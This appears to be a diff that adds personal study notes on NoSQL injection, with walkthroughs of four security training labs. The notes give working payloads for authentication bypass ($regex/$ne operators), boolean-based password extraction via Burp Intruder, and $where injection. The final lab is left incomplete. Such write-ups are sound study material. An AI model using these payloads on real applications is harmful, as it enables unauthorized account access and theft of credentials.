@@ -1,0 +1,125 @@
+
+
+
+
+                                                      NO_SQL injection
+                                                      ----------------
+
+
+
+  => if the app use JSON API , it has many chances to be using no_sql 
+
+ to test if the site use no sql
+ ------------------------------
+ '"`{
+;$Foo}
+$Foo \xYZ
+
+
+
+Lab: Detecting NoSQL injection
+------------------------------
+1. First i click the gift category, and inject basic sqli,
+2. but it doesn't work, when i check '+'(url encoded) , it works
+3. so i check the boolean payload, [' && 0 && '] false payload, not response any product
+4. so i change to true payload [' && 1 && '] , response Gifts products
+5. so i check the true payload like this to show any product => ' || 1 || ' {url encoded}
+6. BOOM!
+
+
+
+
+
+    $where - Matches documents that satisfy a JavaScript expression.
+    $ne - Matches all values that are not equal to a specified value.
+    $in - Matches all of the values specified in an array.
+    $regex - Selects documents where values match a specified regular expression.
+
+
+
+
+
+Lab: Exploiting NoSQL operator injection to bypass authentication
+-----------------------------------------------------------------
+1. First i login with normal user crendential , and check in the burpsuite
+2. i got like this, 
+{"username":"wiener","password":"peter"}
+3. so i inject the no sqli, like 
+
+{"username":{"$regex":"admin.*"}, 
+"password":{"$ne":""}
+}
+4. it works , so i inject to get the administrator like this
+
+{"username":{"$regex":"admin.*"}, 
+"password":{"$ne":""}
+}
+
+5. BOOM!
+
+
+
+
+
+
+Lab: Exploiting NoSQL injection to extract data
+-----------------------------------------------
+1. The vuln is at the /user/lookup?user=wiener
+2. First, I login with wiener's crendential , and then check with burpsuite
+3. i got this, and send to repeater and then inject like this
+
+Boolean payload
+----------------
+wiener' && 0 && 'x => False
+wiener' && 1 && 'x => True
+
+4. so i check the administrator's password like this
+
+check password length
+---------------------
+/user/lookup?user=administrator' && this.password.length < 30 || 'a'='b (url encoded)
+then i got the password length is 8
+
+guessing password with burp intruder
+------------------------------------
+/user/lookup?user=administrator' && this.password[$0$]=='$a$
+change the attack type to Cluster Bomb
+payload 1 => number 0 to 7
+payload 2 => a to z
+attack!!!!!!!!
+
+5. BOOM! 
+
+
+
+
+Lab: Exploiting NoSQL operator injection to extract unknown fields
+------------------------------------------------------------------
+1. First i check the login page and test nosqli injection with
+{
+	"username":{
+	"$regex":"carl.*"
+	},
+	"password":{
+	"$ne":""
+	}
+}
+2. response => Account locked: please reset your password (accepted the $ne) => vulnerable
+
+3. then i add the additional payload like this
+{
+	"username":{
+	"$regex":"carl.*"
+	},
+	"password":{
+	"$ne":""
+	}, 
+	"$where":"0"
+}
+
+response => invalid username or password
+
+4. so i change the $where: 0 to 1 => response => Account locked: please reset your password
+
+5. 
+
